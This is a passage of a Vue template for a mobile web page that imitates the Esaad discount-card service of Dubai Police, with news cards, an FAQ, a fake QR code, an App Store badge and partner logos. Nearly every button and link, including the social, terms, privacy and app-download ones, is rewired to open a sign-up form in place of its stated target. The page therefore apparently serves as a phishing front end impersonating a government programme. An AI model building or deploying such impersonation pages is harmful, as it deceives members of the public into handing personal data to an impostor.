              <circle cx="55" cy="62" r="9" fill="#f3cbb2" />
              <path d="M44 54 Q55 45 66 56 L68 82 L43 82 Z" fill="#d6b485" />
              <!-- 3. Man in Gray Suit -->
              <path d="M82 75 Q102 75 110 160 L72 160 Z" fill="#9ca3af" />
              <rect x="87" y="75" width="10" height="35" fill="#1e293b" />
              <circle cx="92" cy="54" r="10" fill="#e5b89b" />
              <!-- 4. Emirati Official in White Kandura & Ghutra -->
              <path d="M158 74 Q182 74 194 160 L144 160 Z" fill="#ffffff" />
              <circle cx="170" cy="54" r="10" fill="#d49e7d" />
              <path d="M156 44 Q170 35 184 44 L188 86 L152 86 Z" fill="#ffffff" />
              <ellipse cx="170" cy="42" rx="12" ry="3" fill="#111827" />
              <!-- 5. Right Woman in Black Abaya holding Award Plaque -->
              <path d="M210 78 Q236 78 248 160 L198 160 Z" fill="#111827" />
              <circle cx="224" cy="56" r="9.5" fill="#deb092" />
              <path d="M212 46 Q224 38 236 48 L240 86 L208 86 Z" fill="#09090b" />
              <!-- Award Box held in hands -->
              <rect x="208" y="96" width="26" height="28" rx="2" fill="#7c2d12" stroke="#f59e0b" stroke-width="1.5" />
              <circle cx="221" cy="110" r="6" fill="#fbbf24" />
            </svg>
          </div>
          <div class="p-4 text-right">
            <div class="text-gray-500 text-xs mb-2 font-sans">Tuesday 29 Sep 2026</div>
            <h3 class="text-[#008a40] font-extrabold text-[17px] leading-snug mb-2">
              خصومات تصل إلى 15% تشمل مطاعم ومقاهي وفنادق...
            </h3>
            <p class="text-gray-700 text-xs leading-relaxed">
              وقّع مركز بطاقة إسعاد في القيادة العامة لشرطة دبي مذكرة تفاهم مع مجموعة...
            </p>
          </div>
        </article>

        <!-- News Card 2 (Left Card in Screenshot) -->
        <article
          @click="navigateToForm"
          class="min-w-[260px] max-w-[260px] bg-white rounded-2xl shadow-[0_4px_20px_rgba(0,0,0,0.06)] border border-gray-100 overflow-hidden snap-start shrink-0 cursor-pointer"
        >
          <div class="w-full h-40 bg-[#e5eef4] relative overflow-hidden">
            <!-- Custom SVG Illustration of the Official with Laptop & Banner -->
            <svg viewBox="0 0 260 160" class="w-full h-full object-cover">
              <rect width="260" height="160" fill="#f1f5f9" />
              <!-- Background Rollup Banner -->
              <rect x="65" y="8" width="135" height="115" fill="#ffffff" stroke="#cbd5e1" stroke-width="1.5" />
              <circle cx="115" cy="30" r="10" fill="#dcfce7" />
              <text x="165" y="34" fill="#ea580c" font-size="11" font-weight="800">talabat</text>
              <!-- Official in White Kandura & Ghutra at Desk -->
              <path d="M100 78 Q135 78 152 145 L85 145 Z" fill="#ffffff" />
              <circle cx="120" cy="54" r="12" fill="#c98e6b" />
              <path d="M104 42 Q120 32 136 42 L142 90 L98 90 Z" fill="#ffffff" />
              <ellipse cx="120" cy="40" rx="14" ry="3.5" fill="#111827" />
              <!-- Laptop on Desk -->
              <rect x="0" y="132" width="260" height="28" fill="#cbd5e1" />
              <rect x="135" y="102" width="46" height="30" rx="3" fill="#1e293b" />
              <circle cx="158" cy="117" r="3" fill="#94a3b8" />
            </svg>
          </div>
          <div class="p-4 text-right">
            <div class="text-gray-500 text-xs mb-2 font-sans">Wednesday 23 Sep 2026</div>
            <h3 class="text-[#008a40] font-extrabold text-[17px] leading-snug mb-2">
              شراكة استراتيجية لتعزيز عروض التوصيل والخدمات...
            </h3>
            <p class="text-gray-700 text-xs leading-relaxed">
              وقّع مركز بطاقة إسعاد اتفاقية تعاون مشترك لتوفير خصومات حصرية لحاملي البطاقة...
            </p>
          </div>
        </article>

      </div>
    </section>

    <!-- ======================== FAQ SECTION ======================== -->
    <section id="faq" class="px-5 pt-4 pb-12 bg-white">
      <h2 class="text-[25px] font-extrabold text-gray-900 text-right mb-4">
        الأسئلة الشائعة
      </h2>

      <div class="divide-y divide-dashed divide-gray-300 border-b border-dashed border-gray-300">
        <div v-for="item in filteredFaqs" :key="item.id" class="py-4">
          <button
            @click="toggleFaq(item.id)"
            class="w-full flex items-center justify-between gap-3 text-right cursor-pointer group"
          >
            <span class="font-bold text-[15px] text-gray-900 group-hover:text-[#008a40] transition-colors">
              {{ item.question }}
            </span>
            <ChevronDown
              class="w-4 h-4 text-gray-600 shrink-0 transition-transform duration-200"
              :class="item.open ? 'rotate-180 text-[#008a40]' : ''"
            />
          </button>
          <div v-if="item.open" class="mt-3 text-gray-600 text-sm leading-relaxed text-right bg-gray-50 p-3.5 rounded-xl">
            <p>{{ item.answer }}</p>
            <button
              @click="navigateToForm"
              class="mt-2.5 inline-block text-[#008a40] font-bold text-xs hover:underline cursor-pointer"
            >
              الانتقال إلى خدمة البطاقة &larr;
            </button>
          </div>
        </div>
      </div>

      <!-- Bottom FAQ Links -->
      <div class="mt-6 flex items-center justify-end gap-6 text-sm font-bold text-[#008a40]">
        <button @click="navigateToForm" class="hover:underline cursor-pointer">عرض جميع الأسئلة الشائعة</button>
        <button @click="navigateToForm" class="hover:underline cursor-pointer">الاتصال بنا</button>
      </div>
    </section>

    <!-- ======================== DOWNLOAD APP GREEN BANNER ======================== -->
    <section class="bg-[#007b38] text-white px-5 py-9 relative overflow-hidden">
      <div class="flex items-center justify-between gap-4">
        
        <!-- Right Column in RTL: Title, Text, QR Code, App Store Button -->
        <div class="flex-1 text-right z-10">
          <h2 class="text-[22px] font-extrabold mb-2 leading-snug">
            حمّل تطبيق اسعاد الآن!
          </h2>
          <p class="text-white/90 text-xs leading-relaxed mb-5 max-w-[220px]">
            قم بمسح رمز الاستجابة السريعة وانتقل للحصول على آلاف الخصومات المذهلة.
          </p>

          <!-- QR Code Box aligned left of the right column -->
          <div class="flex flex-col items-end gap-4">
            <div
              @click="navigateToForm"
              class="w-20 h-20 bg-white p-1.5 rounded-xl shadow-md cursor-pointer"
              title="مسح رمز الاستجابة السريعة"
            >
              <!-- Crisp SVG QR Code -->
              <svg viewBox="0 0 100 100" class="w-full h-full fill-black">
                <path d="M5,5 h28 v28 h-28 z M11,11 v16 h16 v-16 z M15,15 h8 v8 h-8 z" />
                <path d="M67,5 h28 v28 h-28 z M73,11 v16 h16 v-16 z M77,15 h8 v8 h-8 z" />
                <path d="M5,67 h28 v28 h-28 z M11,73 v16 h16 v-16 z M15,77 h8 v8 h-8 z" />
                <rect x="39" y="5" width="6" height="6" />
                <rect x="51" y="5" width="10" height="6" />
                <rect x="39" y="17" width="12" height="6" />
                <rect x="45" y="27" width="6" height="12" />
                <rect x="57" y="21" width="6" height="12" />
                <rect x="5" y="39" width="12" height="6" />
                <rect x="23" y="39" width="10" height="6" />
                <rect x="11" y="51" width="6" height="10" />
                <rect x="27" y="49" width="12" height="6" />
                <rect x="45" y="45" width="10" height="10" />
                <rect x="61" y="39" width="6" height="12" />
                <rect x="73" y="39" width="12" height="6" />
                <rect x="89" y="45" width="6" height="12" />
                <rect x="39" y="61" width="12" height="6" />
                <rect x="57" y="57" width="10" height="12" />
                <rect x="73" y="53" width="6" height="14" />
                <rect x="83" y="63" width="12" height="6" />
                <rect x="39" y="73" width="6" height="14" />
                <rect x="51" y="75" width="12" height="6" />
                <rect x="67" y="73" width="10" height="10" />
                <rect x="83" y="75" width="12" height="8" />
                <rect x="45" y="89" width="16" height="6" />
                <rect x="69" y="89" width="26" height="6" />
              </svg>
            </div>

            <!-- Official App Store Badge Button -->
            <button
              @click="navigateToForm"
              class="bg-black hover:bg-gray-900 text-white px-4 py-2 rounded-xl border border-white/25 flex items-center gap-2.5 shadow-lg cursor-pointer transition-transform active:scale-95"
              dir="ltr"
            >
              <svg class="w-6 h-6 fill-current shrink-0" viewBox="0 0 24 24">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.96 6.33c.67-.81 1.12-1.94 1-3.08-.96.04-2.13.64-2.82 1.45-.61.7-.115 1.86-1.01 2.98 1.08.08 2.16-.54 2.83-1.35z"/>
              </svg>
              <div class="text-left leading-none">
                <div class="text-[9px] font-normal tracking-tight opacity-90">Download on the</div>
                <div class="text-[16px] font-semibold tracking-tight">App Store</div>
              </div>
            </button>
          </div>
        </div>

        <!-- Left Column in RTL: Realistic iPhone Mockup with Dubai Skyline & Esaad Logo -->
        <div
          @click="navigateToForm"
          class="w-[125px] h-[250px] bg-[#12161f] rounded-[24px] p-1.5 shadow-2xl border-[2.5px] border-gray-700 shrink-0 relative overflow-hidden cursor-pointer"
        >
          <!-- iPhone Notch -->
          <div class="absolute top-1.5 left-1/2 -translate-x-1/2 w-12 h-3 bg-black rounded-b-lg z-20"></div>

          <!-- Screen Content: Dusk City Skyline & Esaad Logo -->
          <div class="w-full h-full rounded-[19px] overflow-hidden relative bg-gradient-to-b from-[#1a2436] via-[#3a2d28] to-[#121318] flex flex-col items-center justify-center">
            <!-- Status bar time -->
            <div class="absolute top-1.5 left-2.5 text-[7px] text-white/80 font-mono">9:41</div>

            <!-- City Skyline Silhouette SVG -->
            <svg viewBox="0 0 120 240" class="absolute inset-0 w-full h-full object-cover opacity-55">
              <!-- Burj Khalifa & Downtown Towers -->
              <polygon points="58,25 60,25 63,190 55,190" fill="#0d131a" />
              <rect x="20" y="95" width="12" height="95" fill="#111822" />
              <rect x="35" y="110" width="14" height="80" fill="#17202c" />
              <rect x="70" y="85" width="15" height="105" fill="#111822" />
              <rect x="88" y="105" width="14" height="85" fill="#161f2c" />
              <!-- Illuminated Highway Trails at Bottom -->
              <path d="M 10 240 L 55 170 L 65 170 L 110 240" fill="none" stroke="#f59e0b" stroke-width="1.5" opacity="0.7" />
              <path d="M 30 240 L 58 175 L 62 175 L 90 240" fill="none" stroke="#fef08a" stroke-width="1" opacity="0.8" />
            </svg>

            <!-- Center Esaad Logo on Phone Screen -->
            <div class="relative z-10 flex flex-col items-center">
              <div class="text-[#a3e635] font-black text-base leading-none">إسعاد</div>
              <div class="text-[#a3e635] font-extrabold text-sm leading-none">esaad</div>
              <svg class="w-9 h-3" viewBox="0 0 60 18" fill="none">
                <circle cx="14" cy="4" r="2" fill="#a3e635" />
                <circle cx="46" cy="4" r="2" fill="#a3e635" />
                <path d="M 6 6 Q 30 18 54 6" stroke="#a3e635" stroke-width="3.2" stroke-linecap="round" />
              </svg>
            </div>
          </div>
        </div>

      </div>
    </section>

    <!-- ======================== FOOTER SECTION ======================== -->
    <footer class="bg-[#f3f9f5] pt-8 text-gray-800">
      <!-- Two-Column Navigation Links -->
      <div class="px-6 grid grid-cols-2 gap-6 text-right text-[15px] font-semibold mb-8">
        <!-- Right Column -->
        <ul class="space-y-3">
          <li><a href="#" @click.prevent="navigateToForm" class="hover:text-[#008a40] transition-colors">الصفحة الرئيسية</a></li>
          <li><a href="#about" class="hover:text-[#008a40] transition-colors">عن إسعاد</a></li>
          <li><button @click="navigateToForm" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">تسجيل عضوية إسعاد</button></li>
          <li><button @click="navigateToCompanyForm" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">تسجيل الشركة</button></li>
        </ul>

        <!-- Left Column -->
        <ul class="space-y-3">
          <li><button @click="navigateToCompanyForm" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">مزايا الشركات</button></li>
          <li><a href="#news" class="hover:text-[#008a40] transition-colors">أخبار</a></li>
          <li><button @click="navigateToForm" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">قصص النجاح</button></li>
          <li><button @click="navigateToForm" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">استفسارات</button></li>
          <li><a href="#faq" class="hover:text-[#008a40] transition-colors">الأسئلة الشائعة</a></li>
        </ul>
      </div>

      <!-- Dubai Police Partner Logos Strip -->
      <div class="px-4 py-6 flex items-center justify-between gap-2 border-t border-gray-200/60" dir="ltr">
        
        <!-- 1. SPS Smart Police Station (Leftmost in LTR / Rightmost in visual check) -->
        <div class="bg-[#e30613] text-white px-2 py-1.5 rounded-xs flex flex-col items-center justify-center shrink-0 w-14 h-11 shadow-xs">
          <span class="font-black text-lg leading-none tracking-tighter">SPS</span>
          <span class="text-[4.5px] font-bold tracking-tight uppercase mt-0.5">SMART POLICE STATION</span>
        </div>

        <!-- 2. Tourist Security Shield -->
        <div class="flex items-center justify-center shrink-0 w-12 h-12">
          <svg viewBox="0 0 50 50" class="w-11 h-11">
            <circle cx="25" cy="25" r="22" fill="#e6f4ec" stroke="#008a40" stroke-width="1.5" stroke-dasharray="3 2" />
            <path d="M25 10 L35 15 V26 C35 33 25 39 25 39 C25 39 15 33 15 26 V15 Z" fill="none" stroke="#008a40" stroke-width="1.8" />
            <text x="25" y="28" text-anchor="middle" fill="#008a40" font-size="6" font-weight="bold">901</text>
          </svg>
        </div>

        <!-- 3. Call 901 For Non-Emergencies -->
        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 80 42" class="w-18 h-10">
            <path d="M22 14 Q40 4 58 14 L54 20 H26 Z" fill="none" stroke="#008a40" stroke-width="1.8" />
            <rect x="14" y="21" width="52" height="14" rx="3" fill="#008a40" />
            <text x="40" y="31" text-anchor="middle" fill="white" font-size="9" font-weight="900">CALL 901</text>
          </svg>
        </div>

        <!-- 4. eCrime -->
        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 80 40" class="w-18 h-10">
            <path d="M20 22 Q45 8 68 20" fill="none" stroke="#008a40" stroke-width="1.8" />
            <path d="M26 25 Q48 13 68 24" fill="none" stroke="#39b54a" stroke-width="1.5" />
            <text x="38" y="34" text-anchor="middle" fill="#006830" font-size="11" font-weight="800">eCrime</text>
          </svg>
        </div>

        <!-- 5. Hemaya International Center -->
        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 60 55" class="w-13 h-12">
            <!-- Green dots tree crown -->
            <circle cx="30" cy="8" r="2.5" fill="#39b54a" />
            <circle cx="22" cy="11" r="2.5" fill="#39b54a" />
            <circle cx="38" cy="11" r="2.5" fill="#39b54a" />
            <circle cx="16" cy="17" r="2.5" fill="#008a40" />
            <circle cx="30" cy="16" r="2.5" fill="#008a40" />
            <circle cx="44" cy="17" r="2.5" fill="#008a40" />
            <!-- Two figures forming trunk -->
            <path d="M22 24 Q28 32 26 42" fill="none" stroke="#008a40" stroke-width="3" stroke-linecap="round" />
            <path d="M38 24 Q32 32 34 42" fill="none" stroke="#39b54a" stroke-width="3" stroke-linecap="round" />
            <text x="30" y="51" text-anchor="middle" fill="#006830" font-size="5.5" font-weight="700">مركز حماية الدولي</text>
          </svg>
        </div>

      </div>

      <!-- Bottom Social & Copyright Bar -->
      <div class="bg-[#e4f2ea] px-5 py-6">
        <div class="flex items-center justify-between mb-5">
          <!-- Right in RTL: Esaad Logo -->
          <div class="flex flex-col items-center">
            <span class="text-[#008a40] font-black text-base leading-none">إسعاد</span>
            <span class="text-gray-900 font-extrabold text-sm leading-none">esaad</span>
            <svg class="w-10 h-3" viewBox="0 0 60 18" fill="none">
              <circle cx="14" cy="4" r="2" fill="#008a40" />
              <circle cx="46" cy="4" r="2" fill="#008a40" />
              <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" />
            </svg>
          </div>

          <!-- Left in RTL: Social Media Icons (YouTube, Facebook, Instagram, X) -->
          <div class="flex items-center gap-2.5" dir="ltr">
            <!-- X -->
            <a href="# main" @click.prevent="navigateToForm" aria-label="X" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
              </svg>
            </a>
            <!-- Instagram -->
            <a href="#main" @click.prevent="navigateToForm" aria-label="Instagram" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="2" y="2" width="20" height="20" rx="5" />
                <circle cx="12" cy="12" r="4" />
                <circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none" />
              </svg>
            </a>
            <!-- Facebook -->
            <a href="#main" @click.prevent="navigateToForm" aria-label="Facebook" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" />
              </svg>
            </a>
            <!-- YouTube -->
            <a href="#main" @click.prevent="navigateToForm" aria-label="YouTube" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M21.58 7.19c-.23-.86-.91-1.54-1.77-1.77C18.25 5 12 5 12 5s-6.25 0-7.81.42c-.86.23-1.54.91-1.77 1.77C2 8.75 2 12 2 12s0 3.25.42 4.81c.23.86.91 1.54 1.77 1.77C5.75 19 12 19 12 19s6.25 0 7.81-.42c.86-.23 1.54-.91 1.77-1.77C22 15.25 22 12 22 12s0-3.25-.42-4.81zM10 15V9l5.2 3-5.2 3z" />
              </svg>
            </a>
          </div>
        </div>

        <!-- Copyright & Legal Links -->
        <div class="text-right text-xs text-gray-600 space-y-1.5">
          <p>© 2026 esaad, كل الحقوق محفوظة.</p>
          <div class="flex flex-wrap items-center justify-start gap-2 text-[11px] text-gray-600">
            <a href="#terms" @click.prevent="navigateToForm" class="hover:text-[#008a40]">الشروط والأحكام</a>
            <span class="text-gray-400">|</span>
            <a href="#privacy" @click.prevent="navigateToForm" class="hover:text-[#008a40]">سياسة الخصوصية</a>
            <span class="text-gray-400">|</span>
            <a href="https://www.dubaipolice.gov.ae" target="_blank" rel="noopener noreferrer" class="hover:text-[#008a40] font-sans">www.dubaipolice.gov.ae</a>
          </div>
        </div>
      </div>
    </footer>

  </div>
</template>
